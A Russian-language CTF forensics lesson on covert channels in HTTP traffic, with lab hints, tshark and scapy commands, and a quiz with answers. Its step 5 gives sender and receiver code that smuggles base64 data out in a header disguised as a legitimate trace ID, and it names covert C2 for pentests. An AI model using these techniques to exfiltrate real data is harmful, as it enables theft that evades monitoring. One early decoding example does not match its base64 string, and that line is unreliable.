---
id: stego-covert-http
title: "Скрытые каналы в HTTP: заголовки, cookies и chunked"
category: stego
parent: stego-covert-channels
difficulty: medium
order: 1
tags: [stego, http, covert-channel, chunked, headers, pcap]
prerequisites: [stego-network]
useful_for:
  - "CTF Stego/Forensics: данные в HTTP-трафике"
  - "Анализ pcap: поиск эксфильтрации через веб"
estimated_minutes: 30
summary: "Как прячут данные в HTTP: нестандартные заголовки, cookies, User-Agent, порядок и регистр, а также chunked-кодирование тела ответа и разбор всего этого через tshark, scapy и Burp."

lab:
  kind: shell
  title: "Практика: найти HTTP-канал"
  toolset: [core, tshark, hex]
  workdir: /home/student/task
  files: [task.md, notes.txt, covert_http.pcap]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "Разбери дамп: `tshark -r covert_http.pcap`."
    - "Собери поток: `tshark -r covert_http.pcap -q -z follow,tcp,ascii,0`."
    - "Заголовки лежат в файле сырыми: `strings covert_http.pcap`."
    - "Сохрани флаг: `strings covert_http.pcap | grep nto > found.txt`."
---

## Вопрос, с которого всё начинается

Тебе дали `exfil.pcap` — запись веб-трафика. Смотришь: обычные запросы к `example.com`, обычные ответы, ничего подозрительного. `strings` по файлу не находит ни флага, ни длинных строк. Но данные точно утекали. Где их искать?

Ответ: в **полях HTTP**, которые ты не привык читать. HTTP — текстовый протокол, а значит почти любое его поле может быть контейнером. Разберём это на нашем pcap.

## Наш пример: exfil.pcap

**HTTP** — протокол обмена между браузером и сервером: запрос состоит из строки (`GET / HTTP/1.1`), **заголовков** (`Host:`, `User-Agent:`) и тела. Заголовок — это пара `Имя: значение`.

Классические места сокрытия:

- **Произвольные заголовки.** Любой `X-Data`, `X-Trace`, `X-Request-Id` может нести base64;
- **Cookie.** Значения часто не валидируются;
- **User-Agent / Referer.** Длинные строки, куда легко вписать данные;
- **Порядок и регистр заголовков.** Перестановка кодирует биты;
- **Chunked encoding.** Размеры чанков несут данные.

Для аналитика ключевая мысль: данные могут быть **в структуре**, а не в значении. Поэтому `strings` часто ничего не даёт.

## Шаг 1: извлекаем заголовки

`tshark` — консольный анализатор pcap. Выведем все строки запросов:

```bash
$ tshark -r exfil.pcap -Y 'http.request' -T fields -e http.request.line | head
Host: example.com\r\n
User-Agent: Mozilla/5.0\r\n
X-Session-Token: ZmxhZ3toZHR0cF9oZWFkZXJ9\r\n
Accept: */*\r\n
```

Фильтр `-Y 'http.request'` оставляет только запросы, `-e http.request.line` печатает все строки. Сразу видно подозрительный заголовок `X-Session-Token` со строкой из base64-алфавита.

## Шаг 2: декодируем

**Base64** — способ записать байты текстом из букв, цифр, `+` и `/`.

```bash
$ echo ZmxhZ3toZHR0cF9oZWFkZXJ9 | base64 -d
flag{http_header}
```

Важно не путать обычный base64 и **base64url**: в URL-контексте `+`/`/` заменяются на `-`/`_`. Если декодер ругается — попробуй заменить их обратно.

Быстрый способ найти все base64-подобные строки в трафике:

```bash
$ tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | grep -oE '[A-Za-z0-9+/]{16,}={0,2}' | while read s; do
      echo -n "$s -> "; echo "$s" | base64 -d 2>/dev/null; echo; done
```

## Шаг 3: chunked encoding

В HTTP/1.1 тело ответа может передаваться **чанками**: каждый чанк предваряется его размером в hex, а завершает всё чанк нулевой длины. Стеганография здесь двух видов:

1. **Данные в размерах чанков** — последовательность размеров кодирует биты, а содержимое безобидно;
2. **«Мусорные» чанки** — между полезными вставляются лишние.

Разбор через `scapy` (библиотека Python для разбора пакетов):

```python
from scapy.all import rdpcap, TCP, Raw
for pkt in rdpcap("chunked.pcap"):
    if pkt.haslayer(Raw):
        data = pkt[Raw].load
        if b"Transfer-Encoding" in data:
            print(data[:200])
```

## Шаг 4: HTTP/2 и HTTP/3

HTTP/2 перестал быть текстовым: заголовки сжаты (HPACK), тело дробится на кадры. Новые каналы:

- **Псевдозаголовки** (`:authority`, `:path`) — редко валидируются глубоко;
- **Padding** — HTTP/2 официально поддерживает выравнивание, «мусорные» байты могут нести данные;
- **Порядок SETTINGS** — параметры соединения можно переставлять.

```bash
$ tshark -r h2.pcap -Y "http2" -T fields -e http2.header.name -e http2.header.value | head
```

HTTP/3 работает поверх QUIC, где данные — в потоках, а заголовки в QPACK.

## Шаг 5: построение канала

Канал строится из двух сторон: отправитель вставляет данные в заголовок, получатель извлекает.

```python
import requests, base64
secret = b"flag{channel}"
requests.get("http://receiver.local/collect",
             headers={"X-Amzn-Trace-Id": base64.b64encode(secret).decode()})
```

```python
from flask import Flask, request
import base64
app = Flask(__name__)
@app.route("/collect")
def collect():
    v = request.headers.get("X-Amzn-Trace-Id", "")
    return base64.b64decode(v).decode()
```

Имя заголовка берут похожим на легитимное — прокси пробрасывают неизвестные поля как есть.

## Сквозной разбор: собираем и разбираем pcap

Проверим методику на настоящей записи. Соберём pcap с одним HTTP-запросом, спрятав base64 в заголовок `X-Session-Token`:

```python
from scapy.all import Ether, IP, TCP, Raw, wrpcap
import base64
payload = base64.b64encode(b"flag{http_header}").decode()
req = (f"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n"
       f"X-Session-Token: {payload}\r\nAccept: */*\r\n\r\n").encode()
pkt = Ether()/IP(src="10.0.0.5",dst="93.184.216.34")/TCP(sport=44444,dport=80,flags="PA")/Raw(load=req)
wrpcap("exfil.pcap", [pkt])
```

Теперь читаем её только через `tshark`, как в реальной задаче:

```bash
$ tshark -r exfil.pcap -Y 'http.request' -T fields -e http.request.line | tr -d '\r'
Host: example.com
User-Agent: Mozilla/5.0
X-Session-Token: ZmxhZ3todHRwX2hlYWRlcn0=
Accept: */*
```

Обрати внимание: `tshark` дописывает `\r\n` и разделяет строки запятыми — их надо чистить (`tr -d '\r'`). Подозрительный заголовок выдаёт себя алфавитом base64. Декодируем:

```bash
$ echo ZmxhZ3todHRwX2hlYWRlcn0= | base64 -d
flag{http_header}
```

Это ровно тот маршрут, который нужен в задаче: `tshark` → фильтр по `http` → `-e http.request.line` → глаз на `X-*` → `base64 -d`.

## Если не сработало

- **Ищешь только значения** — порядок и регистр заголовков тоже канал.
- **Забыл про `\r\n`** — `tshark -T fields` добавляет переводы строк, чисти их.
- **Путаешь base64 и base64url.**
- **Игнорируешь chunked** — тело может быть разбито на сотни чанков.
- **Смотришь только запросы** — ответ сервера такой же канал.
- **Пропустил несколько потоков** — данные могут собираться по порядку из десятков запросов.

## Обнаружение и анализ pcap

Методика для pcap-задачи:

1. `tshark -z io,phs` — статистика протоколов, нет ли подозрительного объёма.
2. `tshark -Y 'http' -T fields -e http.request.line -e http.response.line` — все строки.
3. Поиск аномалий: очень длинные заголовки, редкие `X-*` поля.
4. Проверка chunked: размеры чанков, их регулярность.
5. Декодирование подозрительных значений.

```bash
$ tshark -r exfil.pcap -Y 'http' -T fields -e http.request.line \
  | awk 'length($0) > 100'
```

## Сравнительная таблица каналов

| Канал | Где | Заметность | Извлечение |
|---|---|---|---|
| Произвольный заголовок | значение `X-*` | средняя | низкая |
| Cookie | значение cookie | низкая | низкая |
| User-Agent/Referer | длинные строки | средняя | низкая |
| Порядок заголовков | структура | очень низкая | высокая |
| Chunked-размеры | тело ответа | низкая | средняя |

## Сравнение с DNS- и ICMP-туннелями

HTTP-канал удобнее там, где разрешён только веб. DNS-туннель меньше по объёму (имена короткие), но выживает при агрессивной фильтрации. ICMP-туннель не зависит от веб-прокси, но часто блокируется на периметре. HTTP сочетает большой объём с высокой пропускной способностью, поэтому в CTF и в реальных эксфильтрациях встречается чаще всего.

## Что мы теперь знаем

1. HTTP — текстовый протокол: почти любое поле может нести данные.
2. Главные каналы — **`X-*` заголовки, cookies, User-Agent**.
3. Данные часто в **base64** (иногда base64url).
4. **Chunked**-размеры и **HTTP/2 padding** — структурные каналы.
5. `strings` не поможет — читай **поля** через `tshark`.

## Квиз

Проверь себя.

```quiz
- question: "Где в HTTP чаще всего прячут данные, оставаясь незаметными для прокси?"
  options:
    - "В произвольных заголовках X-* и cookies"
    - "В номере порта"
    - "В DNS-записи"
    - "В имени сетевого интерфейса"
  answer: 0
  explanation: "Прокси обычно валидируют только известные поля."
- question: "Какая команда выведет строки HTTP-заголовков запроса из pcap?"
  options:
    - "`tshark -r cap.pcap -Y http -T fields -e http.request.line`"
    - "`zsteg cap.pcap`"
    - "`binwalk cap.pcap`"
    - "`steghide cap.pcap`"
  answer: 0
  explanation: "http.request.line содержит строки заголовков."
- question: "Что такое chunked encoding и как он может нести данные?"
  options:
    - "Тело разбито на чанки; размеры чанков могут кодировать биты"
    - "Это шифрование тела"
    - "Это сжатие заголовков"
    - "Это резервное копирование ответа"
  answer: 0
  explanation: "Размер каждого чанка — скрытый канал."
- question: "Почему `strings` по pcap часто не находит HTTP-канал?"
  options:
    - "Данные могут быть в структуре (порядок, регистр), а не в значении"
    - "pcap нельзя читать"
    - "HTTP всегда сжат"
    - "Данные всегда в бинарном виде"
  answer: 0
  explanation: "Структурные каналы не видны как строки."
- question: "Как отличить base64url от обычного base64?"
  options:
    - "В base64url символы + и / заменены на - и _"
    - "base64url использует только цифры"
    - "base64url не имеет заполнения"
    - "Они полностью идентичны"
  answer: 0
  explanation: "URL-безопасный алфавит заменяет + и / на - и _."
```

## Куда дальше

Мы разобрали HTTP. Дальше — **ICMP**, служебный протокол, который почти всегда разрешён наружу. А пока запомни: если `strings` молчит, читай поля через `tshark -T fields`.

## Где пригодится

- **CTF:** Stego/Forensics с pcap — заголовки, cookies, chunked.
- **Blue team:** детект эксфильтрации через HTTP, правила для NGFW/IDS.
- **Пентест:** построение скрытых C2-каналов поверх обычного веба.
